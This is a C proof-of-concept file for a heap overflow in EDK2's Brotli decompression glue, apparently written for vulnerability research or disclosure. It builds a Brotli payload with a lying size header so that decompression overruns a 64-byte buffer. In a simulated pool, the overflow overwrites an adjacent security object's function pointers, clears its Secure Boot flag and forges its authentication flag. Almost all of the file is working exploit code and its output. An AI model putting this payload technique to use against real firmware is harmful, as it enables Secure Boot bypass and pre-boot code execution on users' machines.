/*
 * edk2_brotli_overflow_demo.c — EDK2 BrotliDecompress.c heap overflow:
 * end-to-end controlled-corruption demo.
 *
 * Compiles WITHOUT ASAN so the overflow completes.  Shows that an
 * attacker who crafts the Brotli-compressed GUIDed section payload
 * writes chosen bytes into adjacent pool objects — simulated here
 * with a contiguous arena, matching EDK2's DXE pool allocator which
 * places allocations back-to-back with no metadata between them.
 *
 * Layout (simulated pool page):
 *
 *   ┌─────────────────────────┬───────────────────────────────────┐
 *   │  Destination (64 bytes) │  Victim: SecurityContext (64 B)   │
 *   │  ← GetInfo says this    │  ← next pool object; holds fn     │
 *   │    is the full output   │    ptrs, Secure Boot flag, etc.   │
 *   └─────────────────────────┴───────────────────────────────────┘
 *   ▲                          ▲
 *   pool[0]                    pool[64]  ← overflow starts here
 *
 * The Brotli stream decompresses to 256 bytes.  The header lies and
 * says 64.  The glue writes all 256 into the 64-byte destination,
 * overwriting the victim's function pointers and flags with
 * attacker-controlled data.
 *
 * Build (NO ASAN — we want the overflow to complete):
 *   gcc -g -O1 -o demo edk2_brotli_overflow_demo.c \
 *       -lbrotlienc -lbrotlidec
 *
 * Source: tianocore/edk2 HEAD (2026-10-25)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <brotli/encode.h>
#include <brotli/decode.h>

/* ── EDK2 type adaptations ─────────────────────────────────────── */
typedef uint8_t   UINT8;
typedef uint32_t  UINT32;
typedef uint64_t  UINT64;
typedef size_t    UINTN;
typedef ssize_t   INTN;
typedef void      VOID;
typedef int       EFI_STATUS;

#define EFI_SUCCESS            0
#define EFI_INVALID_PARAMETER  1
#define ASSERT(x)              assert(x)
#define CopyMem(d,s,n)         memcpy((d),(s),(n))

#define FILE_BUFFER_SIZE    65536
#define BROTLI_INFO_SIZE    8
#define BROTLI_DECODE_MAX   8
#define BROTLI_SCRATCH_MAX  16

/* ── Scratch-buffer bump allocator (BrotliDecompress.c:18–37) ──── */
typedef struct {
    VOID  *Buff;
    UINTN  BuffSize;
} BROTLI_BUFF;

static VOID *BrAlloc(VOID *Ptr, size_t Size) {
    BROTLI_BUFF *p = (BROTLI_BUFF *)Ptr;
    if (p->BuffSize >= Size) {
        VOID *addr = p->Buff;
        p->Buff     = (VOID *)((UINT8 *)addr + Size);
        p->BuffSize -= Size;
        return addr;
    }
    return NULL;
}

static void BrFree(VOID *Ptr, VOID *Address) {
    (void)Ptr; (void)Address;
}

/* ── BrGetDecodedSizeOfBuf (BrotliDecompress.c:174–191) ────────── */
static UINT64
BrGetDecodedSizeOfBuf(UINT8 *EncodedData, UINT8 StartOffset,
                      UINT8 EndOffset)
{
    UINT64 DecodedSize = 0;
    for (INTN i = EndOffset - 1; i >= StartOffset; i--)
        DecodedSize = (DecodedSize << 8) + EncodedData[i];
    return DecodedSize;
}

/* ── BrotliDecompressInternal (BrotliDecompress.c:81–163) ────────
 * Vulnerable: no bound check on writes to Destination.            */
static EFI_STATUS
BrotliDecompressInternal(const VOID *Source, UINTN SourceSize,
                         VOID *Destination, VOID *BuffInfo)
{
    UINT8 *Input, *Output;
    const UINT8 *NextIn;
    UINT8 *NextOut;
    size_t TotalOut = 0, AvailableIn, AvailableOut = FILE_BUFFER_SIZE;
    VOID *Temp;
    BrotliDecoderResult Result = BROTLI_DECODER_RESULT_ERROR;
    BrotliDecoderState *BroState;

    BroState = BrotliDecoderCreateInstance(BrAlloc, BrFree, BuffInfo);
    Temp     = Destination;
    if (!BroState) return EFI_INVALID_PARAMETER;

    Input  = (UINT8 *)BrAlloc(BuffInfo, FILE_BUFFER_SIZE);
    Output = (UINT8 *)BrAlloc(BuffInfo, FILE_BUFFER_SIZE);
    if (!Input || !Output) {
        BrotliDecoderDestroyInstance(BroState);
        return EFI_INVALID_PARAMETER;
    }

    NextOut = Output;
    Result  = BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT;

    while (1) {
        if (Result == BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT) {
            if (SourceSize == 0) break;
            AvailableIn = (SourceSize >= FILE_BUFFER_SIZE)
                          ? FILE_BUFFER_SIZE : SourceSize;
            CopyMem(Input, Source, AvailableIn);
            Source      = (VOID *)((UINT8 *)Source + AvailableIn);
            SourceSize -= AvailableIn;
            NextIn      = Input;
        } else if (Result == BROTLI_DECODER_RESULT_NEEDS_MORE_OUTPUT) {
            CopyMem(Temp, Output, FILE_BUFFER_SIZE);
            AvailableOut = FILE_BUFFER_SIZE;
            Temp    = (VOID *)((UINT8 *)Temp + FILE_BUFFER_SIZE);
            NextOut = Output;
        } else {
            break;
        }
        Result = BrotliDecoderDecompressStream(
                     BroState, &AvailableIn, &NextIn,
                     &AvailableOut, &NextOut, &TotalOut);
    }

    if (NextOut != Output)
        CopyMem(Temp, Output, (size_t)(NextOut - Output));

    BrotliDecoderDestroyInstance(BroState);
    return (Result == BROTLI_DECODER_RESULT_SUCCESS)
               ? EFI_SUCCESS : EFI_INVALID_PARAMETER;
}

/* ── BrotliUefiDecompress (BrotliDecompress.c:267–295) ─────────── */
static EFI_STATUS
BrotliUefiDecompress(const VOID *Source, UINTN SourceSize,
                     VOID *Destination, VOID *Scratch)
{
    BROTLI_BUFF BroBuff;
    UINT64 GetSize;
    UINT8 MaxOffset = BROTLI_SCRATCH_MAX;

    GetSize = BrGetDecodedSizeOfBuf((UINT8 *)Source,
                  MaxOffset - BROTLI_INFO_SIZE, MaxOffset);
    BroBuff.Buff     = Scratch;
    BroBuff.BuffSize = (UINTN)GetSize;

    return BrotliDecompressInternal(
               (VOID *)((UINT8 *)Source + BROTLI_SCRATCH_MAX),
               SourceSize - BROTLI_SCRATCH_MAX,
               Destination, (VOID *)&BroBuff);
}

/* ── Victim struct — simulates a security-critical DXE object ──── */
typedef struct {
    uint64_t magic;
    uint64_t verify_handler;
    uint64_t authorize_handler;
    uint32_t secure_boot_enabled;
    uint32_t authenticated;
    uint8_t  reserved[24];
} SecurityContext;

static void hexdump(const char *label, const uint8_t *data, size_t len)
{
    printf("  %s:\n", label);
    for (size_t i = 0; i < len; i += 16) {
        printf("    %04zx: ", i);
        for (size_t j = i; j < i + 16 && j < len; j++)
            printf("%02x ", data[j]);
        printf(" |");
        for (size_t j = i; j < i + 16 && j < len; j++)
            printf("%c", (data[j] >= 0x20 && data[j] < 0x7f) ? data[j] : '.');
        printf("|\n");
    }
}

/* ── Main ──────────────────────────────────────────────────────── */
int main(void)
{
    const size_t DECLARED_SIZE = 64;
    const size_t REAL_SIZE     = DECLARED_SIZE + sizeof(SecurityContext);
    const size_t ARENA_SIZE    = REAL_SIZE + 128;

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  EDK2 BrotliDecompress.c — heap overflow demonstration  ║\n");
    printf("║  Controlled corruption of adjacent pool objects         ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    /* ── Simulate EDK2 DXE pool: contiguous allocations ────────── */
    uint8_t *pool = (uint8_t *)malloc(ARENA_SIZE);
    uint8_t *destination = pool;
    SecurityContext *victim = (SecurityContext *)(pool + DECLARED_SIZE);

    /* Initialize victim — as if the DXE core had set it up */
    victim->magic              = 0xDEADBEEFCAFEBABEULL;
    victim->verify_handler     = 0x00007FFF80001000ULL;
    victim->authorize_handler  = 0x00007FFF80002000ULL;
    victim->secure_boot_enabled = 1;
    victim->authenticated      = 0;
    memset(victim->reserved, 0xCC, sizeof(victim->reserved));

    printf("Pool layout (simulates DXE pool page):\n");
    printf("  pool[0..%zu]   = Destination (GetInfo says %zu bytes)\n",
           DECLARED_SIZE - 1, DECLARED_SIZE);
    printf("  pool[%zu..%zu] = SecurityContext victim (adjacent object)\n\n",
           DECLARED_SIZE, DECLARED_SIZE + sizeof(SecurityContext) - 1);

    printf("BEFORE decompression:\n");
    printf("  victim->magic               = 0x%016llx\n",
           (unsigned long long)victim->magic);
    printf("  victim->verify_handler      = 0x%016llx\n",
           (unsigned long long)victim->verify_handler);
    printf("  victim->authorize_handler   = 0x%016llx\n",
           (unsigned long long)victim->authorize_handler);
    printf("  victim->secure_boot_enabled = %u\n",
           victim->secure_boot_enabled);
    printf("  victim->authenticated       = %u\n\n",
           victim->authenticated);
    hexdump("victim raw bytes", (uint8_t *)victim, sizeof(SecurityContext));

    /* ── Craft the attacker's payload ──────────────────────────── *
     * Bytes [0..63]:  legitimate decompressed content (fills dest)
     * Bytes [64..127]: attacker's data — overwrites the victim     */
    uint8_t plaintext[256];
    memset(plaintext, 0, sizeof(plaintext));

    /* Legitimate destination content */
    memset(plaintext, 'L', DECLARED_SIZE);

    /* Attacker payload: overwrites SecurityContext fields */
    SecurityContext *attack = (SecurityContext *)(plaintext + DECLARED_SIZE);
    attack->magic              = 0x4F56455246414C4CULL; /* "OVERFLOW" in LE */
    attack->verify_handler     = 0x4141414141414141ULL; /* attacker's addr  */
    attack->authorize_handler  = 0x4242424242424242ULL; /* attacker's addr  */
    attack->secure_boot_enabled = 0;                    /* disable SB!      */
    attack->authenticated      = 1;                     /* bypass auth!     */
    memcpy(attack->reserved, "ATTACKER_CONTROLLED!", 20);

    /* Compress the full payload with Brotli */
    size_t comp_bound = BrotliEncoderMaxCompressedSize(REAL_SIZE);
    uint8_t *compressed = (uint8_t *)malloc(comp_bound);
    size_t comp_size = comp_bound;

    if (!BrotliEncoderCompress(BROTLI_DEFAULT_QUALITY,
            BROTLI_DEFAULT_WINDOW, BROTLI_DEFAULT_MODE,
            REAL_SIZE, plaintext, &comp_size, compressed)) {
        fprintf(stderr, "FAIL: Brotli compression failed\n");
        return 1;
    }

    printf("\nAttack payload: %zu bytes decompressed, Brotli-compressed to %zu bytes\n",
           REAL_SIZE, comp_size);
    printf("Header LIES: declares %zu bytes (real: %zu)\n\n",
           DECLARED_SIZE, REAL_SIZE);

    /* ── Build EDK2 source buffer with lying header ────────────── */
    size_t scratch_budget = 4u << 20;
    size_t source_size    = BROTLI_SCRATCH_MAX + comp_size;
    uint8_t *source       = (uint8_t *)calloc(1, source_size);

    for (int i = 0; i < 8; i++)
        source[i] = (DECLARED_SIZE >> (i * 8)) & 0xFF;
    for (int i = 0; i < 8; i++)
        source[8 + i] = (scratch_budget >> (i * 8)) & 0xFF;
    memcpy(source + BROTLI_SCRATCH_MAX, compressed, comp_size);

    uint8_t *scratch = (uint8_t *)malloc(scratch_budget);

    /* ── Run the vulnerable decompression ──────────────────────── */
    printf("Calling BrotliUefiDecompress...\n\n");

    EFI_STATUS status = BrotliUefiDecompress(
        source, source_size, destination, scratch);

    printf("BrotliUefiDecompress returned: %s\n\n",
           status == EFI_SUCCESS ? "EFI_SUCCESS" : "EFI_INVALID_PARAMETER");

    /* ── Show the damage ───────────────────────────────────────── */
    printf("AFTER decompression:\n");
    printf("  victim->magic               = 0x%016llx",
           (unsigned long long)victim->magic);
    if (victim->magic != 0xDEADBEEFCAFEBABEULL)
        printf("  ← CORRUPTED");
    printf("\n");

    printf("  victim->verify_handler      = 0x%016llx",
           (unsigned long long)victim->verify_handler);
    if (victim->verify_handler == 0x4141414141414141ULL)
        printf("  ← HIJACKED");
    printf("\n");

    printf("  victim->authorize_handler   = 0x%016llx",
           (unsigned long long)victim->authorize_handler);
    if (victim->authorize_handler == 0x4242424242424242ULL)
        printf("  ← HIJACKED");
    printf("\n");

    printf("  victim->secure_boot_enabled = %u",
           victim->secure_boot_enabled);
    if (victim->secure_boot_enabled == 0)
        printf("                    ← DISABLED BY ATTACKER");
    printf("\n");

    printf("  victim->authenticated       = %u",
           victim->authenticated);
    if (victim->authenticated == 1)
        printf("                    ← FORGED BY ATTACKER");
    printf("\n\n");

    hexdump("victim raw bytes (after)", (uint8_t *)victim,
            sizeof(SecurityContext));

    /* ── Verdict ───────────────────────────────────────────────── */
    int corrupted = 0;
    if (victim->magic != 0xDEADBEEFCAFEBABEULL) corrupted++;
    if (victim->verify_handler == 0x4141414141414141ULL) corrupted++;
    if (victim->authorize_handler == 0x4242424242424242ULL) corrupted++;
    if (victim->secure_boot_enabled == 0) corrupted++;
    if (victim->authenticated == 1) corrupted++;

    printf("\n");
    if (corrupted == 5) {
        printf("RESULT: all 5 victim fields overwritten with attacker-controlled data.\n");
        printf("In firmware: function pointers hijacked, Secure Boot disabled,\n");
        printf("authentication bypassed — before Secure Boot verification completes.\n");
    } else if (corrupted > 0) {
        printf("RESULT: %d of 5 victim fields corrupted.\n", corrupted);
    } else {
        printf("RESULT: no corruption detected (unexpected).\n");
    }

    free(pool);
    free(scratch);
    free(source);
    free(compressed);
    return (corrupted > 0) ? 0 : 1;
}
